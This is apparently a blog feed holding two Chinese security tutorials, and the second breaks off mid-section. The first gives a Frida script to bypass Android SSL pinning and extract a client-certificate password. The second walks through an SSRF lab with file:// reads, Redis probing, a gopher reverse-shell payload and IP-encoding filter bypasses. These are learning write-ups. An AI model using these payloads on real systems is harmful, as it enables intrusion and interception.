我重新刷机再按照上面的步骤走一遍就成功了, 如果你们也遇到访问https网站失败的问题, 可以尝试一下使用这个方法。</p><h1 id="Android抓包介绍"><a href="#Android抓包介绍" class="headerlink" title="Android抓包介绍"></a>Android抓包介绍</h1><p>抓包最重要的是看能不能抓取到数据包, 想要抓到包就要看app使用什么传输协议了, 一般情况下使用HTTP都是能抓到包的, 这也就不难理解, 为什么google坚持推广HTTPS了。为什么说使用HTTPS会抓不到包？现在的HTTPS都是基于TLS协议的, 它的特点就是需要确认传输双方的身份。确认了身份之后再传输数据, 这样就能避免中间人攻击了。下面来看看HTTPS, 是怎么进行数据传输的, 发现HTTPS需要先建立连接才能传输数据。</p><p><img src="https://uploader.shimo.im/f/hUaCWIzHHXkbF39z.png!thumbnail" alt></p><p>讲到要认证对方的身份, 我就想起了之前翻译的一篇<a href="https://se8s0n.github.io/2018/09/11/HTTP%E7%B3%BB%E5%88%97(%E4%BA%94" target="_blank" rel="noopener">HTTP安全</a>), 里面就有提及到在使用HTTPS协议的过程中, 客户端和服务器通过证书来判断对方的身份。之前没有怎么理解, 现在才对证书的作用有比较深刻的理解。</p><p>文章中举了个例子, Chrome浏览器通过判断是否有证书来判断你访问的网站是否安全的, 并不是你访问的网站真的是安全的。提及这个是因为app使用HTTPS传输也是看证书的, 只不过有的app限制的比较严格只信任自带的证书, 有的app安全要求没那么高, 直接信任系统证书。</p><h2 id="抓包出错排查思路"><a href="#抓包出错排查思路" class="headerlink" title="抓包出错排查思路"></a>抓包出错排查思路</h2><p><img src="https://uploader.shimo.im/f/kk50Syi8sFoxSPXQ.jpg!thumbnail" alt></p><p>上面是大概的排查思路, 具体的细节可能有些差异。如果proxy带有证书校验, 且JustTrustMe绕不过去, 可能要自己重新根据该应用定制hook模块, 去绕过其本地证书校验, 但是大部分应用都能通过将证书安装为系统证书绕过, 如果无法在root环境下运行, 文章<a href="https://blog.nviso.be/2019/08/13/intercepting-traffic-from-android-flutter-applications/" target="_blank" rel="noopener">《Intercepting traffic from Android Flutter applications》</a>和JustTrustMe的源码应该能给你提供一点hook模块绕过证书校验的思路, 《Intercepting traffic from Android Flutter applications》讲的是如何绕过google开源框架Flutter中的证书校验进行抓包。</p><p>最后说抓不到包还有一种可能性, 就是要求一定要用SIM卡发出传输请求的数据包….不过这个应该应该只有使用了三大运营商的SDK或他们的应用才会出现这种情况, 这部分应该只能用反向代理才有可能抓取到传输的数据包了, 具体情况就要具体分析了。</p><p>当时尝试tcpdump+wireshark效果不怎么样, 因为所有的数据都经过了加密, 而wireshark不能解密, 所以对于加密传输的数据包这种方法可能有点鸡肋, 听说有<a href="[https://docs.mitmproxy.org/stable/](https://docs.mitmproxy.org/stable/">mitmdump</a>抓包工具专门处理linux环境下http/https的数据包, 不过我自己没用过, 之后要是接触了会进一步补充。</p><h2 id="SSL-pinning和双向认证的区别"><a href="#SSL-pinning和双向认证的区别" class="headerlink" title="SSL pinning和双向认证的区别"></a>SSL pinning和双向认证的区别</h2><p>SSL pinning实际上是客户端锁定服务器端的证书, 在要与服务器进行交互的时候, 服务器端会将CA证书发送给客户端, 客户端会调用函数对服务器端的证书进行校验, 与本地的服务器端证书(存放在<code>\&lt;app&gt;\asset</code>目录或<code>\res\raw</code>下)进行比对。</p><p>而双向认证是添加了客户端向服务器发送CA证书, 服务器端对客户端的证书进行校验的部分, 具体详情可看文章<a href="[https://juejin.im/post/5c9cbf1df265da60f6731f0a](https://juejin.im/post/5c9cbf1df265da60f6731f0a">扯一扯HTTPS单向认证、双向认证、抓包原理、反抓包策略</a>的单向认证、双向认证部分的内容。</p><h2 id="抓取HTTPS的数据包"><a href="#抓取HTTPS的数据包" class="headerlink" title="抓取HTTPS的数据包"></a>抓取HTTPS的数据包</h2><h3 id="Frida绕过SSL单向校验"><a href="#Frida绕过SSL单向校验" class="headerlink" title="Frida绕过SSL单向校验"></a>Frida绕过SSL单向校验</h3><p>昨天刚好遇到JustTrustMe无法绕过SSL单向校验的情况, 这几天接触了Frida, 就尝试用DBI的方法绕过SSL的单向校验, 参考文章<a href="https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/" target="_blank" rel="noopener">Universal Android SSL Pinning bypass with Frida</a>这里就不详细地说明Frida的安装方法及使用方法了。</p><p>设置Fiddler代理, 在本地下载Fiddler的证书, 将证书直接重命名为<code>cert-der.crt</code>。之后将证书push到<code>/data/local/tmp</code>目录下, 在adb shell里输入<code>./frida-server &amp;</code>再在PC端进行操作。</p><p>新建一个frida-android-repinning.js文件, 详细代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    Java.perform(function ()&#123;</span><br><span class="line">    console.log(&quot;&quot;);</span><br><span class="line">    console.log(&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;);</span><br><span class="line"></span><br><span class="line">    var CertificateFactory = Java.use(&quot;java.security.cert.CertificateFactory&quot;);</span><br><span class="line">    var FileInputStream = Java.use(&quot;java.io.FileInputStream&quot;);</span><br><span class="line">    var BufferedInputStream = Java.use(&quot;java.io.BufferedInputStream&quot;);</span><br><span class="line">    var X509Certificate = Java.use(&quot;java.security.cert.X509Certificate&quot;);</span><br><span class="line">    var KeyStore = Java.use(&quot;java.security.KeyStore&quot;);</span><br><span class="line">    var TrustManagerFactory = Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;);</span><br><span class="line">    var SSLContext = Java.use(&quot;javax.net.ssl.SSLContext&quot;);</span><br><span class="line"></span><br><span class="line">    // Load CAs from an InputStream</span><br><span class="line">    console.log(&quot;[+] Loading our CA...&quot;)</span><br><span class="line">    var cf = CertificateFactory.getInstance(&quot;X.509&quot;);</span><br><span class="line">    </span><br><span class="line">    try &#123;</span><br><span class="line">    var fileInputStream = FileInputStream.$new(&quot;/data/local/tmp/cert-der.crt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch(err) &#123;</span><br><span class="line">    console.log(&quot;[o] &quot; + err);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var bufferedInputStream = BufferedInputStream.$new(fileInputStream);</span><br><span class="line">  var ca = cf.generateCertificate(bufferedInputStream);</span><br><span class="line">    bufferedInputStream.close();</span><br><span class="line"></span><br><span class="line">var certInfo = Java.cast(ca, X509Certificate);</span><br><span class="line">    console.log(&quot;[o] Our CA Info: &quot; + certInfo.getSubjectDN());</span><br><span class="line"></span><br><span class="line">    // Create a KeyStore containing our trusted CAs</span><br><span class="line">    console.log(&quot;[+] Creating a KeyStore for our CA...&quot;);</span><br><span class="line">    var keyStoreType = KeyStore.getDefaultType();</span><br><span class="line">    var keyStore = KeyStore.getInstance(keyStoreType);</span><br><span class="line">    keyStore.load(null, null);</span><br><span class="line">    keyStore.setCertificateEntry(&quot;ca&quot;, ca);</span><br><span class="line">    </span><br><span class="line">    // Create a TrustManager that trusts the CAs in our KeyStore</span><br><span class="line">    console.log(&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;);</span><br><span class="line">    var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();</span><br><span class="line">    var tmf = TrustManagerFactory.getInstance(tmfAlgorithm);</span><br><span class="line">    tmf.init(keyStore);</span><br><span class="line">    console.log(&quot;[+] Our TrustManager is ready...&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(&quot;[+] Hijacking SSLContext methods now...&quot;)</span><br><span class="line">    console.log(&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;)</span><br><span class="line"></span><br><span class="line">   SSLContext.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).implementation = function(a,b,c) &#123;</span><br><span class="line">   console.log(&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;);</span><br><span class="line">   SSLContext.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).call(this, a, tmf.getTrustManagers(), c);</span><br><span class="line">   console.log(&quot;[+] SSLContext initialized with our custom TrustManager!&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,0);</span><br></pre></td></tr></table></figure></p><p>在cmd, 输入如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span><br><span class="line">$ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span><br></pre></td></tr></table></figure></p><p>在关闭应用的情况下(避免Magisk Hide处于开启状态), 可得到回显并绕过SSL pinning。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572486642/M_1_EUWZ_6_CO2SM09_3DTP_ue6fyd.png" alt></p><h3 id="绕过SSL双向校验"><a href="#绕过SSL双向校验" class="headerlink" title="绕过SSL双向校验"></a>绕过SSL双向校验</h3><p>其实SSL双向校验是在SSL单向校验的基础上, 在说明这部分内容的时候同时也会有绕过SSL单向校验详细的步骤。参考文章<a href="https://juejin.im/post/5cc313755188252d6f11b463#heading-14" target="_blank" rel="noopener">Android平台HTTPS抓包解决方案及问题分析</a>, 我们可以先用sxxl.app来练练手。</p><p>在手机上设置完代理之后, 点击完确认, 发现app出现如下弹窗：</p><p><img src="https://uploader.shimo.im/f/T4lkr2dfT64GsoGS.png!thumbnail" alt></p><p>在这个时候查看Fiddler会发现应用没有发出任何请求, 这是因为app会对服务器端的证书进行校验, 这时候我们前面安装的Fiddler证书就不起作用了, 应用在发现证书是伪造的情况下拒绝发送请求。根据这个报错+抓不到包, 我们可以确定应用是存在单向校验的, 也就是SSL pinning, 让我们先来解决SSL pinning的问题。使用JustTrustMe可以绕过客户端的证书校验, 下面勾选上JustTrustMe, 在Xposed框架下使用JustTrustMe绕过SSL pinning。</p><p><img src="https://uploader.shimo.im/f/UPkqz9e37SE4Xaru.png!thumbnail" alt></p><p>绕过SSL pinning之后, 就能使用Fiddler抓取到HTTPS的数据包了。</p><p><img src="https://uploader.shimo.im/f/KwSgy60dfJcbQMM1.png!thumbnail" alt></p><p>我随便输入了一个手机号码, 按下确定之后, 服务器回传了400的状态码过来, 说需要发送证书以确认客户端的身份。到这一步基本能确定是存在双向校验的了, 接下来的工作就是绕过SSL服务器端的校验了。</p><p><img src="https://uploader.shimo.im/f/nwwxTjE5olYSkSwi.png!thumbnail" alt></p><p>如果服务器端会对客户端证书进行校验, 证书应该就直接存放在apk里, 网上与SSL双向校验相关的文章都将证书放到<code>&lt;app&gt;/asset</code>目录下, 也就是app的资源目录下, 也有可能放在<code>/res/raw</code>目录下。直接将app解压之后, 发现证书的位置如下：</p><p><img src="https://uploader.shimo.im/f/CtqP7d0fS4wjbr9I.png!thumbnail" alt></p><p>如果找半天没找到就用关键词<code>.p12/.pfx</code>搜索证书文件。</p><p>在我们要使用该证书的时候, 需要输入安装证书的密码。这时候就需要从源码中获取安装证书的密码了。可能是因为多个dex文件的原因, 直接用JEB反编译的时候出错了, 所以我用GDA反编译来分析应用的源代码</p><h3 id="获取安装证书的密码"><a href="#获取安装证书的密码" class="headerlink" title="获取安装证书的密码"></a>获取安装证书的密码</h3><p>发现通过关键词”PKCS12”能够定位到加载证书的位置。</p><p><img src="https://uploader.shimo.im/f/cDmjJ9Saj7QOuMPj.png!thumbnail" alt></p><p>上图第二个红框中的load函数的第二个参数其实就是证书的密钥, 追根溯源, 我们可以知道v1参数是下图中调用的函数的返回值。</p><p><img src="https://uploader.shimo.im/f/W1FO2Ksc7o0iQLav.png!thumbnail" alt></p><p><img src="https://uploader.shimo.im/f/xgSd7HinNxEFom6X.png!thumbnail" alt></p><p>上图的函数的功能就是传递p0参数, 也就是说p0参数就是证书安装密码。想获取这个密码, 关键在于Auto_getValue函数。到这一步, 只要跟进Null_getStorePassword函数看看就好了。</p><p><img src="https://uploader.shimo.im/f/br5qyHIOEE0K1VTV.png!thumbnail" alt></p><p>跟进去发现调用了native层的函数, 查看init函数中具体加载的是哪个so文件：</p><p><img src="https://uploader.shimo.im/f/Z0FUAIiTgggcHRh6.png!thumbnail" alt></p><p>用IDA反编译soul-netsdk之后, 搜索字符串”getStorePassword”, 就定位到函数getStorePassword上了, F5之后, 获得伪代码和密钥：</p><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1570862584/ND0HGHRQSXYF0_4_ZGOVH_S_xsuhlc.png" alt></p><h3 id="代理添加客户端证书"><a href="#代理添加客户端证书" class="headerlink" title="代理添加客户端证书"></a>代理添加客户端证书</h3><p>HttpCanary添加客户端证书进行抓包的过程可以参照文章<a href="https://juejin.im/post/5cc313755188252d6f11b463" target="_blank" rel="noopener">Android平台HTTPS抓包解决方案及问题分析</a>, 在自己头昏的时候也感谢这篇文章的作者MegatronKing点醒我。下面主要讲解Fiddler和burpsuite添加客户端证书的方法。</p><h4 id="fiddler操作过程"><a href="#fiddler操作过程" class="headerlink" title="fiddler操作过程"></a>fiddler操作过程</h4><p>尝试一下用Fiddler处理这部分的内容来安装客户端的证书, 用来绕过双向认证。</p><p><img src="https://uploader.shimo.im/f/BA9URi7xMhU1YpJZ.png!thumbnail" alt></p><p>用Fiddler抓取该应用的数据包的时候, 发现Fiddler出现了上面的弹窗, 提示要添加ClientCertificate.cer, 才能抓取到传输的数据包, 不然只会出现400的状态码。而我们文件目录下只能找到<code>client.p12</code>和<code>client.crt</code>两种格式的证书文件, 所以我们需要将已有的client证书转换成<code>.cer</code>格式的证书。</p><p><img src="https://uploader.shimo.im/f/bnnR07VNGrkkYp8e.png!thumbnail" alt></p><p>好像应用中只出现<code>.p12</code>格式的证书的情况比较常见, 所以下面只会提及如何使用openssl将<code>.p12</code>格式的证书转换成<code>.cer/.der</code>格式的证书。(.der和.cer格式的证书仅有文件头和文件尾不同)</p><p>下面的命令实现了证书的格式转换, <code>.p12</code>-&gt;<code>.pem</code>-&gt;<code>.cer</code>, 在生成<code>.pem</code>格式的证书之后, 需要输入证书的密码, 也就是我们上面逆向获取的证书密码。最后将<code>ClientCertificate.cer</code>移动到之前Fiddler弹窗出现的目录下, 也就是<code>&lt;Fiddler安装路径&gt;\Fiddler2</code>下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将.p12证书转换成.pem格式</span><br><span class="line">$ openssl pkcs12 -in client.p12 -out ClientCertificate.pem -nodes</span><br><span class="line">Enter Import Password:</span><br><span class="line"># 将.pem证书转换成.cer格式</span><br><span class="line">$ x509 -outform der -in ClientCertificate.pem -out ClientCertificate.cer</span><br></pre></td></tr></table></figure><p>现在打开Fiddler尝试抓包, 发现原本显示400的数据包现在能够正常抓取到了, 如果还是不能正常抓取到, 双击<code>client.p12</code>将证书安装到本地试试看。<br><img src="https://uploader.shimo.im/f/zxLh4rfh1QgxsjpV.jpg!thumbnail" alt></p><h4 id="burp操作过程"><a href="#burp操作过程" class="headerlink" title="burp操作过程"></a>burp操作过程</h4><p>手机的burpsuite证书安装成功之后, 我们会发现只能抓取到400的状态码。</p><p><img src="https://uploader.shimo.im/f/yRSl5MMwMaslgxiK.png!thumbnail" alt></p><p>因为要绕过服务器端对证书的验证, 我们还需要在这里添加上面我们在asset目录下找到的证书。</p><p><img src="https://uploader.shimo.im/f/RMgh5cCQ5NY8JmI4.png!thumbnail" alt></p><p><img src="https://uploader.shimo.im/f/WKtrjYYS5l0TTp0D.png!thumbnail" alt></p><p>安装完就能正常抓取数据包了。</p><h2 id="抓取TCP的数据包"><a href="#抓取TCP的数据包" class="headerlink" title="抓取TCP的数据包"></a>抓取TCP的数据包</h2><p>现在还不知道怎么能够获取TCP的数据包并对其中的内容进行解密, 不过之前在看雪上看到一篇分析使用TCP传输协议的文章<a href="https://bbs.pediy.com/thread-251063.htm" target="_blank" rel="noopener">某直播APP逆向TCP协议分析</a>, 我大概看了一下, 文章是从逆向的角度分析的, 具体怎么从渗透的角度发现是TCP协议传输的数据包还没有分析过, 看作者使用了wireshark抓取应用的数据包并进行分析, 这个还是要重新分析一下的。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>文章最后, 还要感谢华华师傅, 其实实习的时候接触android的时间也不长, 但是之后真的让我接触到很多和学到很多, 也谢谢师傅能耐心地帮我解答问题, 感恩。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这篇文章算是总结一下我之前抓包遇到的一些问题, 个人属性里带bug, 所以遇到的问题会比较多, 算是给大家提供一个抓包抓不到应该如何解决的思
      
    
    </summary>
    
    
      <category term="Android 渗透" scheme="http://Se8S0n.github.io.git/tags/Android-%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-LABS指南</title>
    <link href="http://Se8S0n.github.io.git/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/"/>
    <id>http://Se8S0n.github.io.git/2019/05/19/SSRF-LABS指南/</id>
    <published>2019-05-19T22:09:29.000Z</published>
    <updated>2021-08-05T06:51:27.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF-LABS指南"><a href="#SSRF-LABS指南" class="headerlink" title="SSRF-LABS指南"></a>SSRF-LABS指南</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在网上找到一个学习SSRF的环境，<a href="https://github.com/m6a-UdS/ssrf-lab/blob/master/basics/www/testhook.php" target="_blank" rel="noopener">SSRF-LABS</a>有一个好看又简洁的界面，提供了最基本的<a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener">REST API</a>和客户端WebHook功能用于SSRF测试。前面只是大概的介绍，知道就好，不用花费过多精力了解。</p><h3 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h3><p>服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完整的攻击链。<br><img src="https://user-gold-cdn.xitu.io/2017/8/7/a89839b837b0c4e897a77445f9615482?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我的环境是Ubuntu16.04，如果使用其他的系统，可能安装docker的方法不同，可以到网上搜一下。下面为安装docker的步骤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sSL https://get.docker.com/ | sh #脚本安装docker</span><br><span class="line">$ apt install docker-compose #安装docker compose</span><br></pre></td></tr></table></figure></p><p>先按照下面的命令把<code>basic</code>这一关搭建好，其他的基本相同。在创建容器的时候避免出冲突，端口<code>8999</code>在设置要注意，避免与本地已开启端口产生冲突。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/m6a-UdS/ssrf-lab.git</span><br><span class="line">$ cd ~/ssrf-lab/basics #进入basics文件夹</span><br><span class="line">$ docker build -t ssrf-lab/basic . #构建镜像</span><br><span class="line">$ docker run -d -p 8999:80 ssrf-lab/basic #创建容器</span><br><span class="line">$ docker ps #查看ssrf-lab/basic容器编号</span><br><span class="line">$ docker stop [容器编号] #关闭容器</span><br></pre></td></tr></table></figure></p><p>在Advances系列的文件夹还有ctf中没有<code>dockerfile</code>文件，只有<code>docker-compose.yml</code>文件，这时候我们就要在构建镜像的时候就换<code>docker-compose</code>来创建镜像并开启容器了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/ssrf-lab/advanced1 # 进入advanced1目录下</span><br><span class="line">$ docker-compose up -d #开启容器</span><br><span class="line">$ docker-compose down #关闭容器</span><br></pre></td></tr></table></figure></p><p>在开启容器的时候的时候出了问题，因为在官网找不到urllib2的下载路径，编辑<code>~/ssrf-lab/advanced2/flask-webserver</code>文件，去掉其中的urllib2。</p><h3 id="Part-1：basic"><a href="#Part-1：basic" class="headerlink" title="Part 1：basic"></a>Part 1：basic</h3><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><p>打开页面，OUTGOING WEBHOOK部分输入的<em><a href="https://yourhandler.io/events" target="_blank" rel="noopener">https://yourhandler.io/events</a></em>是有REST API监听的需要测试项目，在SEE THE RESULT的部分会显示请求响应的结果和状态码。输入<em><a href="https://yourhandler.io/events" target="_blank" rel="noopener">https://yourhandler.io/events</a></em>的位置就可以作为一个测试点。</p><p>我们先用<code>http://127.0.0.1</code>进行测试。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557629899/SSRF/1557629749_1.png" alt><br>发现数据显示出来了，说明这里没有对内网IP进行限制。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557630022/SSRF/1557630002_1.png" alt></p><p>为了进一步进行测试，我们来了解一下URL的结构。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://user:pass@host:port/path?query=value#fragment</span><br></pre></td></tr></table></figure></p><p>从结构中我们可以看出不同的SSRF的利用姿势，有协议、URL绕过等等。这一关就尝试从协议入手，用file协议代替http协议或者https协议。在测试点输入<code>file:///etc/passwd</code>我们可以得到用户文件，我们也可以通过这样的方式获得其他文件。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557647222/SSRF/1557647189.png" alt><br>成功之后我们可以通过深挖配置文件和源代码进行我们进一步的渗透，比如获得数据库的用户凭证。这里成功实现是因为URL没有经过严格的过滤，更准确地说应该是完全没经过过滤，下一关不会这么简单了。</p><h4 id="SSRF协议中的利用"><a href="#SSRF协议中的利用" class="headerlink" title="SSRF协议中的利用"></a>SSRF协议中的利用</h4><p>看了很多教程都是结合Redis服务一起讲的，为了方便介绍下面几个协议，我们先在ssrf-basics容器里面安装该服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps #查看容器编号</span><br><span class="line">$ docker exec -it [ssrf-lab/basics容器编号] /bin/bash #进入容器</span><br><span class="line">$ apt-get install redis-server # 安装redis服务</span><br><span class="line">$ redis-server #开启redis服务</span><br></pre></td></tr></table></figure><p>这一关可以利用协议收集信息及反弹shell，都是没用协议白名单的锅，导致多个协议利用起来毫无阻力。</p><h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p>上面尝试的过的<code>file:///etc/passwd</code>就是利用了file协议，利用这个协议可以读取主机内任意文件。</p><h5 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h5><p>利用dict协议，<code>dict://127.0.0.1:6379/info</code>可获取本地redis服务配置信息。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558146811/SSRF/1558146771_1.png" alt></p><p>还可以用<code>dict://127.0.0.1:6379/KEYS *</code>获取redis存储的内容<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558175937/SSRF/1558175907_1.png" alt></p><h5 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h5><p>通过Gopher协议可以反弹shell，下面为具体的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure></p><p>这个看起来不太清晰，urldecode之后，就可以看到具体的命令。下面为解码之后的内容，我把关键的redis指令放到同一行中。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179454_1.png" alt></p><p>在页面能看到如下的回显<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179650/SSRF/1558179636_1.png" alt></p><p>为了验证是否成功了，我在ssrf-lab/basics容器里面查看插入的KEY值。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179319_1.png" alt></p><h3 id="Part-2：Advance1"><a href="#Part-2：Advance1" class="headerlink" title="Part 2：Advance1"></a>Part 2：Advance1</h3><h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><p>这一关用了正则表达式限制内网IP的访问，具体的代码如下。必须要吐槽一下，这个方法真的是一个很糟糕的方法，因为它实际上不能起到很好的安全防护作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;#^https?://#i&apos;, $handler) !== 1) &#123;  </span><br><span class="line">    echo &quot;Wrong scheme! You can only use http or https!&quot;;  </span><br><span class="line">    die();</span><br><span class="line">&#125; else if (preg_match(&apos;#^https?://10.0.0.3#i&apos;, $handler) === 1) &#123;  </span><br><span class="line">    echo &quot;Restricted area!&quot;;  </span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>现在我们就用<code>http://10.0.0.3</code>来测试<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557661100/SSRF/1557661064_1.png" alt></p><p>我们可以很明显地看到没有获得响应，但是神奇的IP地址有多种表达方式，我们可以用这些方式来绕过上面那么直白的限制。先用整数表达<code>http://167772163</code>发出请求。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557673405/SSRF/1557673345_1.png" alt><br>成功了，我们可以来看看IP地址的表达方式。众所周知，IP地址是由四个字节组成的，一旦包含了小数点，就必须考虑到大小端表示，因为这个会影响IP地址的解析。不过好在所有的网络地址都是大端表示法，只需要注意这一点即可，下面我们介绍IP地址的表达方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure></p><p>这些表达方式都能被<code>curl</code>命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用16进制<code>0x0A000003</code>表示IP地址，还有一个很少人知道的绕过小姿势，就是用8进制代替10进制来表示IP地址。在计算机的世界里，一旦在<code>20</code>前面加个<code>0</code>就会变成8进制，比如<code>http://01200000003</code>实际上还是<code>http://10.0.0.3</code>。上面两个表达方式，PHP的curl模块能解析出来。</p><p>下面总结一下几种变形<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span 